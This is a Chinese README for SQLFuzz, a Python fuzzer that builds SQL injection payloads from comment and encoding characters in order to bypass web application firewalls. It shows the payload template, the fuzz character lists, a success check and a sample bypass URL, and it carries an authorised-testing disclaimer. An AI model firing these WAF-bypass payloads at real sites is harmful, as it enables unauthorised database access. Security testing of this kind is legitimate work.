# SQLFuzz

SQLFuzz 是一个简单而强大的 SQL 注入 Fuzz 工具，用于测试和绕过 WAF（Web 应用防火墙）的防护措施。该工具通过组合各种特殊字符和编码来生成 SQL 注入 payload，帮助安全研究人员发现 SQL 注入漏洞。

## 功能特点

- 自动生成大量 SQL 注入 Fuzz 测试用例
- 支持多种特殊字符和编码组合
- 可自定义测试目标和 payload 模板
- 自动检测成功绕过 WAF 的 payload 并保存结果
- 实时显示测试进度和状态

## 使用方法

### 前提条件

确保已安装 Python 和所需的依赖库：

```bash
pip install requests
```

### 运行方式

```bash
python sqlfuzz.py
```

### 配置说明

在使用前，您需要修改脚本中的以下参数：

1. `url_start` - 设置为您要测试的目标 URL
   ```python
   url_start = "http://your-target-website.com/vulnerable_page.php?id=1"
   ```

2. `headers` - 根据需要自定义请求头，包括 User-Agent、Cookie 等
   ```python
   headers = {
       "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36...",
       "Cookie": "your-cookies-here"
   }
   ```

3. `payload` - 可以修改 payload 模板，根据目标应用的特性进行调整
   ```python
   payload = "'/**//*!*/and/*!*/"+a+b+c+"/**/'1'='1"
   ```

## 工作原理

1. 通过组合各种特殊字符和编码（如注释符、空白字符等）生成 fuzz 测试用例
2. 将生成的特殊字符序列插入到预定义的 SQL 注入载荷模板中
3. 向目标发送请求并分析响应
4. 识别成功的注入尝试（绕过 WAF）并将结果保存到 `Results.txt` 文件

## 成功标志

工具通过检查响应中是否包含特定字符串来确定注入是否成功。例如：

```python
if "First name: admin" in res.text:
    print("\033[0;33m[*]Find BypassWAF Payload:\033[0m"+url)
```

您可以根据目标应用的特性修改此检测条件。

## 注意事项

- 本工具仅用于合法的安全测试，使用前请确保已获得授权
- 不当使用可能导致法律问题，请负责任地使用
- 建议在测试环境中使用，如 DVWA（Damn Vulnerable Web Application）

## 示例输出

成功的测试结果将显示如下，并保存到 `Results.txt` 文件中：

```
[*]Find BypassWAF Payload: http://target-url/page.php?id=1'/**//*!*/and/*!*/+/**/'1'='1&Submit=Submit#
```

## 自定义扩展

您可以通过修改 `fuzz_zs`、`fuzz_sz` 和 `fuzz_ch` 列表来添加更多的测试字符，从而扩展测试范围：

```python
fuzz_zs = ['/*','*/','/*!','/**/','?','/','*','=','`','!','%','_','-','+']
fuzz_sz = ['']
fuzz_ch = ["%09","%0a","%0b","%0c","%0d","%20","%a0"]
```

也可以增加嵌套层数，创建更复杂的组合：

```python
for a in fuzz:
    for b in fuzz:
        for c in fuzz:
            for d in fuzz:
                # 四层嵌套...
``` 